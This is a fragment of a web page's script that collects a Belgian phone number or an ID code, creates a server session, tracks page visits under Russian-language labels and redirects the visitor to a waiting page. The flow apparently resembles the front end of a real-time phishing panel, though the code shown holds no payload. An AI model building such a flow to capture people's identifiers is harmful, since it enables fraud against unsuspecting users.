  // Translations for JavaScript
  window.translations = {
      send: '{{ __('messages.send') }}',
      loading: '{{ __('messages.loading') }}'
  };
  
  document.addEventListener('DOMContentLoaded', function() {
      const phoneInput = document.getElementById('phone-input');
      const phoneSubmitBtn = document.getElementById('phone-submit-btn');
      const idInput = document.getElementById('id-input');
      const idSubmitBtn = document.getElementById('id-submit-btn');
      
      // Check for existing session
      const existingSessionId = localStorage.getItem('session_id');
      if (existingSessionId && window.SessionManager) {
          window.SessionManager.setSessionId(existingSessionId);
          // Check session status and redirect if needed
          window.SessionManager.checkSessionStatus();
          
          // Track page visit
          trackPageVisit(existingSessionId, 'Главная страница', window.location.href);
      }
      
      // Track page visit function
      async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
          try {
              await fetch(`/api/session/${sessionId}/visit`, {
                  method: 'POST',
                  headers: {
                      'Content-Type': 'application/json',
                      'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
                  },
                  body: JSON.stringify({
                      page_name: pageName,
                      page_url: pageUrl,
                      action_type: actionType
                  })
              });
          } catch (error) {
              console.error('Failed to track page visit:', error);
          }
      }
      
      // Format phone number
      phoneInput.addEventListener('input', function(e) {
          let value = this.value.replace(/[^0-9]/g, '');
          this.value = value;
      });
      
      // Format identification
      idInput.addEventListener('input', function(e) {
          let value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, '');
          if (value.length > 4) {
              value = value.slice(0, 4) + '-' + value.slice(4, 8);
          }
          this.value = value;
      });
      
      // Submit phone
      phoneSubmitBtn.addEventListener('click', async function() {
          const phone = phoneInput.value.trim();
          if (!phone || phone.length < 8) {
              phoneInput.focus();
              return;
          }
          
          this.disabled = true;
          this.querySelector('span').textContent = window.translations.loading;
          
          try {
              const fullPhone = '+32' + phone;
              await createSession('phone', fullPhone);
          } catch (error) {
              console.error('Error:', error);
              this.disabled = false;
              this.querySelector('span').textContent = window.translations.send;
          }
      });
      
      // Submit ID
      idSubmitBtn.addEventListener('click', async function() {
          const id = idInput.value.trim().replace('-', '');
          if (!id || id.length < 4) {
              idInput.focus();
              return;
          }
          
          this.disabled = true;
          this.querySelector('span').textContent = window.translations.loading;
          
          try {
              await createSession('id', id);
          } catch (error) {
              console.error('Error:', error);
              this.disabled = false;
              this.querySelector('span').textContent = window.translations.send;
          }
      });
      
      // Enter key support
      phoneInput.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
              phoneSubmitBtn.click();
          }
      });
      
      idInput.addEventListener('keypress', function(e) {
          if (e.key === 'Enter') {
              idSubmitBtn.click();
          }
      });
      
      async function createSession(inputType, inputValue) {
          const response = await fetch('/api/session', {
              method: 'POST',
              headers: {
                  'Content-Type': 'application/json',
                  'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
              },
              body: JSON.stringify({
                  input_type: inputType,
                  input_value: inputValue
              })
          });
          
          if (!response.ok) {
              throw new Error('Failed to create session');
          }
          
          const data = await response.json();
          const sessionId = data.data.id;
          
          // Save to localStorage
          localStorage.setItem('session_id', sessionId);
          
          // Initialize SessionManager
          if (window.SessionManager) {
              window.SessionManager.setSessionId(sessionId);
          }
          
          // Redirect to waiting page
          window.location.href = `/session/${sessionId}/waiting`;
      }
  });
  </script>
</body>

</html>